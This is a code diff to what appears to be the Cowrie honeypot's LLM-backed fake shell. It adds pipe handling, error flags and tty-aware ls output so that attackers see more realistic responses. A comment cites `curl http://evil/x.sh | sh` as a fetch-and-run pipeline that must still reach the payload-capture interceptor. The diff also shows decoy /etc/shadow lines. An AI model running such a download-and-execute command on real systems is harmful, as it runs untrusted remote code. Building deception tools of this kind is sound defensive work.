@@ -15,21 +15,26 @@ import hashlib
 import re
 import shlex
 import time
-from dataclasses import dataclass
+from dataclasses import dataclass, replace
 from datetime import datetime, timezone
 from typing import TYPE_CHECKING
+
+from cowrie.llm import pipefilters
 
 if TYPE_CHECKING:
     from cowrie.llm.persona import Persona
     from cowrie.llm.worldstate import WorldState
 
 # Shell metacharacters that mean "this is not a single simple command".
+# `|` is deliberately absent: split_pipeline() handles pipelines, and
+# _respond_simple() only ever sees an individual stage. Everything here
+# still defers, and split_pipeline rejects `||` outright before splitting.
 # If any appear we decline (return None) and let the LLM narrate, because
 # our deterministic renderers only model one command's stdout — they would
 # produce wrong output for `cat /etc/passwd | grep root` etc. A trailing
 # `&` (backgrounding) is handled separately by the caller, so it is not in
 # this set; we strip it before checking.
-_METACHARS = ("|", ">", "<", ";", "&&", "||", "$(", "`", "\n")
+_METACHARS = (">", "<", ";", "&&", "||", "$(", "`", "\n")
 
 
 @dataclass
@@ -53,6 +58,10 @@ class ShellContext:
     # (memory in use, load averages). Same seed -> same numbers across
     # turns, so repeated `free` calls don't drift.
     seed: str = ""
+    # True when this command's stdout feeds a pipe rather than a terminal.
+    # Only `ls` currently cares: real ls emits one name per line when it
+    # is not writing to a tty.
+    piped: bool = False
 
     @property
     def user(self) -> str:
@@ -72,11 +81,30 @@ class ResponderResult:
     """
 
     output: str = ""
+    # True when `output` is really stderr — "No such file or directory"
+    # and friends. On a real box that text never traverses a pipe, so the
+    # pipeline path declines rather than filtering it.
+    is_error: bool = False
     # Set when we recognized an interactive/full-screen command we choose
     # not to emulate deterministically (vim, bare top, ...). The caller may
     # use this to enrich the LLM hint. We still return None from respond()
     # in that case so the LLM handles it; this field is informational.
     note: str = ""
+
+
+def _pipes_enabled() -> bool:
+    """Kill switch for pipeline handling.
+
+    Read lazily rather than at import so operators can flip it without a
+    code change, and so tests can drive it. Imported inside the function to
+    keep this module free of a config dependency on the non-piped path.
+    """
+    try:
+        from cowrie.core.config import CowrieConfig
+
+        return CowrieConfig.getboolean("llm", "pipe_filters", fallback=True)
+    except Exception:
+        return True
 
 
 def respond(command: str, ctx: ShellContext) -> ResponderResult | None:
@@ -102,6 +130,40 @@ def _respond(command: str, ctx: ShellContext) -> ResponderResult | None:
     if raw.endswith("&") and not raw.endswith("&&"):
         return None
 
+    stages = pipefilters.split_pipeline(raw)
+    if stages is None:
+        return None
+    if len(stages) == 1:
+        return _respond_simple(raw, ctx)
+    if not _pipes_enabled():
+        return None
+
+    # A pipeline. The first stage MUST resolve through _DISPATCH or the
+    # whole thing defers — there is deliberately no filter-only fast path.
+    # That invariant is what keeps `curl http://evil/x.sh | sh` reaching
+    # the download interceptor: _try_deterministic runs before
+    # _try_download_intercept, so a pipeline we "handled" locally would
+    # silently lose the payload capture.
+    result = _respond_simple(stages[0], ctx, piped=True)
+    if result is None or result.is_error:
+        # Error text is stderr on a real box and would not traverse the
+        # pipe. Rather than filter it (and print e.g. a grepped error), we
+        # defer so the LLM narrates the whole line coherently.
+        return None
+
+    text = result.output
+    for stage in stages[1:]:
+        filtered = pipefilters.apply_filter(text, stage)
+        if filtered is None:
+            return None  # unmodelled filter or flag — defer the pipeline
+        text = filtered
+    return ResponderResult(output=text)
+
+
+def _respond_simple(
+    raw: str, ctx: ShellContext, *, piped: bool = False
+) -> ResponderResult | None:
+    """Render one simple command — no pipes, no other shell operators."""
     if any(mc in raw for mc in _METACHARS):
         return None
 
@@ -111,6 +173,12 @@ def _respond(command: str, ctx: ShellContext) -> ResponderResult | None:
         return None
     if not argv:
         return None
+
+    if piped:
+        # Real `ls` switches to one name per line when stdout is not a
+        # tty. Without this `ls | wc -l` reports 1 instead of the file
+        # count — removing one fingerprint while creating another.
+        ctx = replace(ctx, piped=True)
 
     # Peel leading `sudo [-n] [-u USER] [-S] ...` — the wrapped command runs
     # as root (or the -u target). We model that by overriding the effective
@@ -641,7 +709,9 @@ def _etc_group(ctx) -> str:
 
 def _etc_shadow(ctx, user) -> ResponderResult:
     if user != "root":
-        return ResponderResult(output="cat: /etc/shadow: Permission denied\n")
+        return ResponderResult(
+            output="cat: /etc/shadow: Permission denied\n", is_error=True
+        )
     lines = [
         "root:$6$rounds=656000$abcdefgh$0aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYz012345:19000:0:99999:7:::",
         "daemon:*:19000:0:99999:7:::",
@@ -730,7 +800,8 @@ def _cat_one(path: str, ctx, user) -> ResponderResult | None:
     if path in ("/etc/debian_version",):
         if p.family != "debian":
             return ResponderResult(
-                output=f"cat: {path}: No such file or directory\n"
+                output=f"cat: {path}: No such file or directory\n",
+                is_error=True,
             )
         major = "12.7" if "12" in p.distro else (
             "11.11" if "Debian" in p.distro else
@@ -745,13 +816,15 @@ def _cat_one(path: str, ctx, user) -> ResponderResult | None:
     if path in ("/etc/redhat-release", "/etc/centos-release", "/etc/system-release"):
         if p.family != "rhel":
             return ResponderResult(
-                output=f"cat: {path}: No such file or directory\n"
+                output=f"cat: {path}: No such file or directory\n",
+                is_error=True,
             )
         return ResponderResult(output=f"{p.distro}\n")
     if path == "/etc/alpine-release":
         if p.family != "alpine":
             return ResponderResult(
-                output=f"cat: {path}: No such file or directory\n"
+                output=f"cat: {path}: No such file or directory\n",
+                is_error=True,
             )
         return ResponderResult(output=p.distro.replace("Alpine Linux v", "") + ".0\n")
     if path in table:
@@ -1352,7 +1425,10 @@ def _h_ls(args, ctx, user):
         return None  # multi-path ls has per-path headers — defer
     target = _resolve_path(paths[0], ctx) if paths else ctx.cwd
     vfs = vfsmod.VFS(ctx.world, ctx.login_user)
-    out = vfsmod.render_ls(vfs, target, long=long_, all_=all_, username=user)
+    out = vfsmod.render_ls(
+        vfs, target, long=long_, all_=all_, username=user,
+        one_per_line=ctx.piped,
+    )
     if out is None:
         return None
     return ResponderResult(output=out)
@@ -1369,7 +1445,11 @@ def _h_stat(args, ctx, user):
     target = _resolve_path(positional[0], ctx)
     vfs = vfsmod.VFS(ctx.world, ctx.login_user)
     out = vfsmod.render_stat(vfs, target, username=user)
-    return ResponderResult(output=out) if out is not None else None
+    if out is None:
+        return None
+    # "cannot statx ..." is stderr on a real box; flag it so a pipeline
+    # declines rather than grepping an error message.
+    return ResponderResult(output=out, is_error=out.startswith("stat: cannot"))
 
 
 # ----------------------------------------------------------------------
